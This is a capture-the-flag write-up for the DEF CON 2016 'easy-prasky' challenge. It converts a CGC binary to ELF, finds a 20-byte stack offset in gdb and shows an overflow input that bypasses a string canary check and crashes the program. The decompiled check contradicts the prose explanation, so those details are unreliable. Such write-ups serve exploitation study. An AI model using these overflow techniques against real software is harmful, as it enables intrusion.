---
title: "easy-prasky"
sidebar_position: 1
---
## **Information**

### **Description**
```
<http://download.quals.shallweplayaga.me/335e35448b30ce7697fbb036cce45e34/easy-prasky.tar.bz2>

easy-prasky\_335e35448b30ce7697fbb036cce45e34.quals.shallweplayaga.me:10001
```

### **File**

* [easy-prasky.tar.bz2](/attachments/327916/327915.bz2)

### **Source Code**

## **Writeup**

### File information

* Using the file command, we can check the following information:

```sh title="File information"
$ tar -jxvf easy-prasky.tar.bz2
$ cd easy-prasky-with-buffalo-on-bing/
$ file easy-prasky-with-buffalo-on-bing 
easy-prasky-with-buffalo-on-bing: data
```

* To obtain accurate file information, check the header of the file.
* Checking the file header reveals that this is a CGC (Cyber Grand Challenge) format file.

```sh title="hexdump -C easy-prasky-with-buffalo-on-bing | head"
00000000  7f 43 47 43 01 01 01 43  01 4d 65 72 69 6e 6f 00  |.CGC...C.Merino.|
00000010  02 00 03 00 01 00 00 00  b7 86 04 08 34 00 00 00  |............4...|
00000020  80 08 00 00 00 00 00 00  34 00 20 00 03 00 28 00  |........4. ...(.|
00000030  05 00 04 00 06 00 00 00  34 00 00 00 34 80 04 08  |........4...4...|
00000040  34 80 04 08 60 00 00 00  60 00 00 00 04 00 00 00  |4...`...`.......|
00000050  04 00 00 00 01 00 00 00  00 00 00 00 00 80 04 08  |................|
00000060  00 80 04 08 3e 08 00 00  3e 08 00 00 05 00 00 00  |....>...>.......|
00000070  00 10 00 00 01 00 00 00  3e 08 00 00 00 00 00 00  |........>.......|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 10 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

:::note[Cyber Grand Challenge ]
<https://repo.cybergrandchallenge.com/>
:::

### **Binary analysis**

#### **Preferences for running cgc files**

* DARPA provides an environment for running CGC files using Vagrant.

```sh title="VMs"
cgc-linux-dev.box	ae1e267b86ac556dac2ed7c6dfc6ffc9370a2134c1a53387c1809e09d21fa27e
vm.json				7f553ee1cf6d16dae7a23bf9738d678042b33a86caf1525a3e8aaf44d4cb12c5 
Vagrantfile			ff0f8b4a3996a137d2a6eb7088a632928068425b9c4502f6c754c3f079672d00
```

* Visit the following site to download and install Vagrant:

:::note[Download Vagrant]
<https://www.vagrantup.com/downloads.html>
:::

* Download the "Vagrantfile" from "<http://repo.cybergrandchallenge.com/boxes/>" and run the following command:

```sh title="Vagrant command"
$ vagrant up
Bringing machine 'cb' up with 'virtualbox' provider...
Bringing machine 'ids' up with 'virtualbox' provider...
Bringing machine 'pov' up with 'virtualbox' provider...
Bringing machine 'crs' up with 'virtualbox' provider...
Bringing machine 'ti' up with 'virtualbox' provider...
==> cb: Importing base box 'cgc-linux-dev'...
==> cb: Matching MAC addresss for NAT networking...
==> cb: Checking if box 'cgc-linux-dev' is up to date...
...
==> ti: stdin: is not a tty
==> ti: Running provisioner: file...
==> ti: Running provisioner: shell...
    ti: Running: inline script
==> ti: stdin: is not a tty
$
```

* You can connect to the VM using the following command (Password: vagrant):

```sh title="Vagrant connect"
$ ssh vagrant@127.0.0.1 -p 2222
vagrant@127.0.0.1's password: 
Linux cgc-linux-packer 3.13.11-ckt21-cgc #1 SMP Mon Feb 29 16:42:11 UTC 2016 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
vagrant@cb:~$
```

* Transfer the "easy-prasky-with-buffalo-on-bing" file to the CGC VM:

```sh title="File transfer"
$ scp -P 2222 easy-prasky-with-buffalo-on-bing vagrant@127.0.0.1:/home/vagrant
vagrant@127.0.0.1's password: 
easy-prasky-with-buffalo-on-bing                                                                                                   100% 2376     2.3KB/s   00:00    
$
```

* You can execute the transferred file as follows:

```sh title="Execution result"
vagrant@cb:~$ ./easy-prasky-with-buffalo-on-bing 
test    
canary okvagrant@cb:~$
```

#### CGC to elf

* As explained earlier, because this file is in the CGC file format, IDA recognizes it as a data file.
* To analyze this file in IDA Pro, the file format must be converted.
  + You can convert the CGC file format to the ELF file format using "cgc2elf" provided by the Cyber Grand Challenge.

```sh title="cgc2elf installation"
$ sudo dpkg -i cgc2elf_10206-cfe-rc6_i386.deb 
Selecting previously unselected package cgc2elf.
(Reading database ... 209320 files and directories currently installed.)
Preparing to unpack cgc2elf_10206-cfe-rc6_i386.deb ...
Unpacking cgc2elf (10206-cfe-rc6) ...
Setting up cgc2elf (10206-cfe-rc6) ...
Processing triggers for man-db (2.6.7.1-1ubuntu1) ...
$
```

:::note[CGC Packages]
<http://repo.cybergrandchallenge.com/deb/>
:::

* The CGC file format was converted to the ELF file format using "cgc2elf" as shown below:

```sh title="cgc to elf"
$ file easy-prasky-with-buffalo-on-bing 
easy-prasky-with-buffalo-on-bing: data
$ cgc2elf easy-prasky-with-buffalo-on-bing 
$ file easy-prasky-with-buffalo-on-bing 
easy-prasky-with-buffalo-on-bing: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, stripped
$ checksec.sh --file easy-prasky-with-buffalo-on-bing_CGC 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   easy-prasky-with-buffalo-on-bing_CGC
$
```

#### sub\_8048370()

* This function performs the following operations:  
  + Stores the string "lddwDrwhkTEBSya\_" into Canary.
  + Stores the value received from user input into "userInputStr".
    - This function receives input using scanf().
    - The input value can overwrite the value stored in Canary.
  + Compares whether the value stored in Canary matches "lddw" using the strncmp() function.
    - If the canary variable contains the string "lddw", it prints "canary ok".
    - If the canary variable does not contain the string "lddw", it prints "hacking detected, see ya".

```c title="sub_8048370"
int sub_8048370()
{
  char userInputStr; // [esp+2Fh] [ebp-29h]@1
  char Canary; // [esp+43h] [ebp-15h]@1

  strncpy(&Canary, "lddwDrwhkTEBSya_", 17);
  scanf((int)&userInputStr);
  if ( !strncmp((int)&Canary, (int)"lddwDrwhkTEBSya_", 4) )
  {
    printf((int)"hacking detected, see ya");
    exit(-1);
  }
  return printf((int)"canary ok");
}
```

### Structure of Exploit code
```
1. User input bypasses the Canary check and triggers a Segmentation fault.
```
* The following information is required for an attack:
```
1. Verify memory structure ("userInputStr", "canary")
```

### **Information for attack**

#### **Check memory structure**

* Set breakpoints as follows:
  + 0x804839d : strncpy()
  + 0x80483a8 : scanf()

```sh title="Break point"
(gdb) b *0x8048000 + 0x39d
Breakpoint 1 at 0x804839d
(gdb) b *0x8048000 + 0x3a8
Breakpoint 2 at 0x80483a8
```

* The string "lddwDrwhkTEBSya\_" is stored in the canary area (0xbffff6c3) by the strncpy() function.

```sh title="Break point 1 - strncpy()"
(gdb) r
Starting program: /home/lazenca0x0/Documents/DEFCON 2016/easy-prasky-with-buffalo-on-bing 
Break point 1, 0x0804839d in ?? ()
(gdb) x/wx $esp
0xbffff680:	0xbffff6c3
(gdb) x/wx 0xbffff6c3
0xbffff6c3:	0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x080483a8 in ?? ()
(gdb) x/wx 0xbffff6c3
0xbffff6c3:	0x7764646c
(gdb) x/s 0xbffff6c3
0xbffff6c3:	"lddwDrwhkTEBSya_"
```

* The address of userInputStr is 0xbffff6af, and the address of canary is 0xbffff6c3.
  + 0xbffff6c3 - 0xbffff6af = 0x14 (20 bytes)
  + In other words, user input can overwrite the values in the canary area.

```sh title="Break point 2 - scanf()"
(gdb) x/wx $esp
0xbffff680:	0xbffff6af
(gdb) x/20wx 0xbffff6af
0xbffff6af:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff6bf:	0x00000000	0x7764646c	0x68777244	0x4245546b
0xbffff6cf:	0x5f617953	0x00000000	0xfff6e800	0x048432bf
0xbffff6df:	0x00000008	0x00000000	0x00000000	0x0486c100
0xbffff6ef:	0x00000108	0xfff81a00	0x000000bf	0xfff86100
(gdb)
```

#### **Key information**

1. Memory address of "userInputStr" variable: 0xbffff6af
2. Memory address of "canary" variable: 0xbffff6c3
3. Offset between "userInputStr" and "canary": 20 bytes

## **Exploit Code**

```sh title="Exploit result"
vagrant@cb:~$ ./easy-prasky-with-buffalo-on-bing_CGC 
AAAAAAAAAAAAAAAAAAAAlddwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
canary okSegmentation fault (core dumped)
vagrant@cb:~$
```

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**
